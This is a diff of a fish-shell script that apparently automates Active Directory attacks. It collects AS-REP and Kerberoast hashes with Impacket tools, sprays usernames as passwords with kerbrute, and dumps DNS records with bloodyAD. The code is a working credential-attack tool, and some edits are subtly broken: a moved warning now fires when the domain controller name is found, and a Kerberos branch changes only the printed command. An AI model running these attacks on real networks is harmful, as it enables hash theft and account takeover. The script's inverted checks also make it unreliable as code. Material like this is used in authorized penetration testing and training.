@@ -79,6 +79,13 @@ Examples:
         set file_domain $_flag_target_domain
     end
 
+    # Extract DC FQDN from /etc/hosts if needed for Kerberos
+    set dc_fqdn ""
+    set dc_fqdn (awk -v target="$target" '$1 == target {max_len=0; fqdn=""; for(i=2; i<=NF; i++) {if(length($i) > max_len) {max_len=length($i); fqdn=$i}} print fqdn; exit}' /etc/hosts)
+    if test -n "$dc_fqdn"
+        ezpz_warn "DC FQDN not found in /etc/hosts for $target. Kerberos may fail."
+    end
+
     # Build nxc authentication arguments (domain\user format)
     set nxc_auth $target -u "$domain\\$user"
     
@@ -103,10 +110,7 @@ Examples:
             ezpz_cmd "Using KRB5CCNAME at $KRB5CCNAME"
         end
         
-        # Extract DC FQDN from /etc/hosts if needed for Kerberos
-        set dc_fqdn ""
-        set dc_fqdn (awk -v target="$target" '$1 == target {max_len=0; fqdn=""; for(i=2; i<=NF; i++) {if(length($i) > max_len) {max_len=length($i); fqdn=$i}} print fqdn; exit}' /etc/hosts)
-        
+               
         if test -n "$dc_fqdn"
             # Change IP to FQDN
             set nxc_auth[1] $dc_fqdn
@@ -114,8 +118,6 @@ Examples:
             # Create IP-only version for commands that require IP (like --dc-list)
             set nxc_auth_ip $nxc_auth
             set nxc_auth_ip[1] $target
-        else
-            ezpz_warn "DC FQDN not found in /etc/hosts for $target. Kerberos may fail."
         end
             
         
@@ -228,45 +230,19 @@ Examples:
     ezpz_header "Searching for AS-REProastable accounts"
     set asrep_file "$file_domain"_asrep.hash
     if set -q _flag_target_domain
-        ezpz_cmd "GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file"
+        ezpz_cmd "GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file -request"
         if test -f $users_file
-            set output (GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file 2>&1)
-            set error_lines (string split '\n' $output | grep -E "(No entries found|KDC_ERR_|PREAUTH_FAILED)")
-            if test -n "$error_lines"
-                for line in $error_lines
-                    echo $line | sed 's/^\[\-\] //'
-                end
-            else
-                echo $output | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
-            end
-            GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file -outputfile $asrep_file >/dev/null 2>&1
+            GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file -outputfile $asrep_file | grep -iE "(No entries found|Error)"
         else
-            ezpz_warn "Users file $users_file not found. Skipping AS-REP roasting with usersfile."
-            set output (GetNPUsers.py $imp_auth 2>&1)
-            set error_lines (string split '\n' $output | grep -iE "(No entries found|Error)")
-            if test -n "$error_lines"
-                for line in $error_lines
-                    echo $line | sed 's/^\[\-\] //'
-                end
-            else
-                echo $output | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
-            end
-            GetNPUsers.py $imp_auth -outputfile $asrep_file >/dev/null 2>&1
+            ezpz_warn "Users file $users_file not found. Skipping cross-domain AS-REP roasting with usersfile."
         end
     else
         ezpz_cmd "GetNPUsers.py $imp_auth -request"
-        set output (GetNPUsers.py $imp_auth 2>&1)
-        set error_lines (string split '\n' $output | grep -iE "(No entries found|Error)")
-        if test -n "$error_lines"
-            for line in $error_lines
-                echo $line | sed 's/^\[\-\] //'
-            end
-        else
-            echo $output | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
-        end
-        GetNPUsers.py $imp_auth -request -outputfile $asrep_file >/dev/null 2>&1
+        GetNPUsers.py $imp_auth -request -outputfile $asrep_file | grep -iE "(No entries found|Error)"
     end
+
     if test -f $asrep_file
+        cat $asrep_file
         ezpz_info "Saving hashes to $asrep_file"
     end
 
@@ -274,20 +250,13 @@ Examples:
     set kerb_file "$file_domain"_kerb.hash
     if set -q _flag_target_domain
         ezpz_cmd "GetUserSPNs.py $imp_auth -target-domain $_flag_target_domain -request"
+        GetUserSPNs.py $imp_auth -target-domain $_flag_target_domain -request -outputfile $kerb_file | grep -iE "(No entries found|Error)"
     else
         ezpz_cmd "GetUserSPNs.py $imp_auth -request"
+        GetUserSPNs.py $imp_auth -request -outputfile $kerb_file | grep -iE "(No entries found|Error)"
     end
-    set output (GetUserSPNs.py $imp_auth 2>&1)
-    set error_lines (string split '\n' $output | grep -E "(No entries found|KDC_ERR_|PREAUTH_FAILED)")
-    if test -n "$error_lines"
-        for line in $error_lines
-            echo $line | sed 's/^\[\-\] //'
-        end
-    else
-        echo $output | grep --color=never "\\S" | tail -n +4 | awk '{print $2 " ||| "$1}' | column -s "|||" -t
-    end
-    GetUserSPNs.py $imp_auth -request -outputfile $kerb_file >/dev/null 2>&1
     if test -f $kerb_file
+        cat $kerb_file
         ezpz_info "Saving hashes to $kerb_file"
     end
 
@@ -321,7 +290,7 @@ Examples:
                     set -a pre2k_cmd -no-pass
                 end
             else
-                set pre2k_cmd pre2k unauth -d $domain -dc-ip $target -inputfile $users_file
+                set pre2k_cmd pre2k unauth -d $domain -dc-ip $target -inputfile $users_tmp
             end
             
             ezpz_cmd "$pre2k_cmd"
@@ -338,9 +307,8 @@ Examples:
     if test "$confirm" = "y" -o "$confirm" = "Y"
         if test -s $users_tmp
             ezpz_header "Starting username-as-password bruteforce..."
-            while read -l target_user
-                nxc smb $target -u $target_user -p $target_user 2>/dev/null | grep '\[+]' | tr -s " " | cut -d " " -f 6
-            end < $users_tmp
+            ezpz_cmd "kerbrute passwordspray --dc $domain -d $domain $users_tmp --user-as-pass"
+            kerbrute passwordspray --dc $domain -d $domain $users_tmp --user-as-pass | grep -oE "VALID LOGIN.*"
         else
             ezpz_error "User list is empty. Run RID bruteforce first. Skipping."
         end
@@ -405,7 +373,11 @@ Examples:
     # DNS Dump using bloodyAD
     if command -v bloodyAD >/dev/null 2>&1
         ezpz_header "Enumerating DNS records"
-        ezpz_cmd "bloodyAD $bloody_auth get dnsDump"
+        if set -q _flag_kerb -a -n "$dc_fqdn"
+            ezpz_cmd "bloodyAD --host $dc_fqdn -d $domain -u $user -k get dnsDump"
+        else
+            ezpz_cmd "bloodyAD $bloody_auth get dnsDump"
+        end
         timeout 60 bloodyAD $bloody_auth get dnsDump 2>/dev/null | awk '
         {
             if (/^recordName:/) {
